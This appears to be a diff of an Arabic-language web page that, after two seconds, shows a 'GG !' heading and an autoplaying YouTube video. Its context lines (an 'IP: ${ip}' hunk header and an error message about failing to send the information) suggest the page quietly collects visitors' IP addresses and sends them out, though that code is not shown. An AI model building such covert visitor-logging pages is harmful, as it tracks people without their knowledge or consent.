@@ -2,7 +2,7 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>welcome</title>
+  <title>GG</title>
   <style>
     body {
       margin: 0;
@@ -12,24 +12,38 @@
       justify-content: center;
       align-items: center;
       height: 100vh;
+      flex-direction: column;
+      color: white;
+      font-family: sans-serif;
     }
     #video-container {
       display: none;
-      width: 100%;
-      height: 100%;
+      width: 480px;
+      height: 270px;
+      position: relative;
     }
     iframe {
       width: 100%;
       height: 100%;
       border: none;
     }
+    #gg-text {
+      font-size: 48px;
+      font-weight: bold;
+      margin-bottom: 20px;
+      display: none;
+    }
   </style>
 </head>
 <body>
 
+  <div id="gg-text">GG !</div>
+
   <div id="video-container">
-    <iframe src="https://www.youtube.com/embed/kZu8cLhZpuA?si=8sKfx92yGdVrPFCQ&autoplay=1"
-            allow="autoplay; encrypted-media" allowfullscreen>
+    <iframe 
+      src="https://www.youtube-nocookie.com/embed/kZu8cLhZpuA?autoplay=1&controls=0&showinfo=0&modestbranding=1&rel=0&mute=0"
+      allow="autoplay; encrypted-media"
+      allowfullscreen>
     </iframe>
   </div>
 
@@ -73,9 +87,10 @@ IP: ${ip}
         console.error('❌ فشل في إرسال المعلومات:', err);
       }
 
-      // بعد ثانيتين يطلع المقطع
+      // بعد ثانيتين يظهر الفيديو والنص GG
       setTimeout(() => {
         document.getElementById('video-container').style.display = 'block';
+        document.getElementById('gg-text').style.display = 'block';
       }, 2000);
     }
 
